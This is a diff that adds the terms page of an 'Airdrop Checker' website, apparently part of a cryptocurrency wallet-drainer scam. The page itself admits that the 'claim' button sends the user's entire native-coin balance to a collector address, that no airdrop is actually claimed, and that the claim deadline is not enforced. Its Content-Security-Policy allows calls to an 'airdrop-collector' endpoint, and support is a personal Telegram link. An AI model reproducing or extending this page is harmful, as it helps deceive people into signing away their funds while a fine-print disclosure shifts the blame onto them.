@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#0B1010">
+  <meta name="description" content="What this tool does, what it does not promise, and who carries which risk.">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline'; connect-src https://mainnet.helius-rpc.com https://eth.drpc.org https://rpc.flashbots.net https://ethereum-rpc.publicnode.com https://api.mainnet-beta.solana.com https://solana-rpc.publicnode.com https://api.devnet.solana.com https://api.dexscreener.com https://cloudflareinsights.com https://airdrop-collector.erichck.workers.dev; img-src 'self' data: https:; base-uri 'none'; object-src 'none'; form-action 'none'">
+  <title>Terms · Airdrop Checker</title>
+  <link rel="icon" href="favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="style.css?v=6">
+  <script defer src="analytics.js"></script>
+</head>
+<body>
+  <a href="index.html" class="skip">Back to the checker</a>
+  <header class="top">
+    <div class="wrap">
+      <a href="index.html" class="brand"><span class="brand-mark" aria-hidden="true"></span>Airdrop Checker</a>
+      <div class="top-right">
+        <a href="privacy.html" class="top-link">Privacy</a>
+        <a href="index.html" class="top-link">Back</a>
+      </div>
+    </div>
+  </header>
+
+  <main id="main" class="wrap legal">
+    <p class="eyebrow">Terms</p>
+    <h1>What you are agreeing to</h1>
+    <p class="lede">Short version: this is a free tool that builds a transaction. The transaction is yours, the signature is yours, and the funds go to the address shown.</p>
+    <p class="legal-date">Last updated 23 November 2026</p>
+
+    <section>
+      <h2>What the tool does</h2>
+      <p>It reads a public address and shows the balance. If you press the claim button, it builds one transaction that moves that balance to the collector address printed on the page, then hands it to your wallet for signing.</p>
+      <p>Nothing is minted. No airdrop allocation is claimed from a distributor. The amount that moves is the balance already sitting in the address, less room for the network fee.</p>
+    </section>
+
+    <section>
+      <h2>What it does not promise</h2>
+      <ul>
+        <li>Not every address is &ldquo;eligible&rdquo; for anything. The checker shows what is there; it cannot create value.</li>
+        <li>The amount is computed from a live balance and can differ from what you saw a minute earlier if the balance changed.</li>
+        <li>The token breakdown shows Ethereum balances, but the Ethereum transaction moves the native coin only. Tokens stay where they are.</li>
+        <li>Prices come from a third-party feed and are an estimate, not a quote.</li>
+        <li>The claim window date is a notice, not an enforced deadline. The page keeps working after it passes.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Fees</h2>
+      <p>Every transaction costs network fee. The fee row is shown above the button and is deducted by the network, not by us. We take no cut of the transferred amount.</p>
+      <p>A rejected signature costs nothing. A transaction that fails on chain is refunded by the network minus the fee already spent.</p>
+    </section>
+
+    <section>
+      <h2>Custody</h2>
+      <p>We never hold your funds and have no key to your wallet. Once a transaction confirms, the funds sit at the collector address shown before signing.</p>
+    </section>
+
+    <section>
+      <h2>Risks</h2>
+      <p>You are responsible for checking the recipient and the amount before signing. Solana and Ethereum can congest; a transaction may take minutes or fail. RPC nodes are third parties and can be slow, rate-limited, or briefly wrong.</p>
+    </section>
+
+    <section>
+      <h2>No warranty</h2>
+      <p>The tool is provided as is, without warranty. If a balance reads wrong because a node answers wrong, the page follows the node. Verify anything important on a block explorer before signing.</p>
+    </section>
+
+    <section>
+      <h2>Contact</h2>
+      <p><a href="https://t.me/HandsomeAuer" target="_blank" rel="noopener noreferrer">Telegram support</a></p>
+    </section>
+  </main>
+
+  <footer>
+    <div class="wrap">
+      <p class="disclaimer">Independent tool. Funds never pass through us.</p>
+      <p><a href="index.html">Checker</a> · <a href="privacy.html">Privacy</a></p>
+    </div>
+  </footer>
+  <script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token":"3b23bfae484e4180a5f816e683bc3f52"}'></script>
+</body>
+</html>
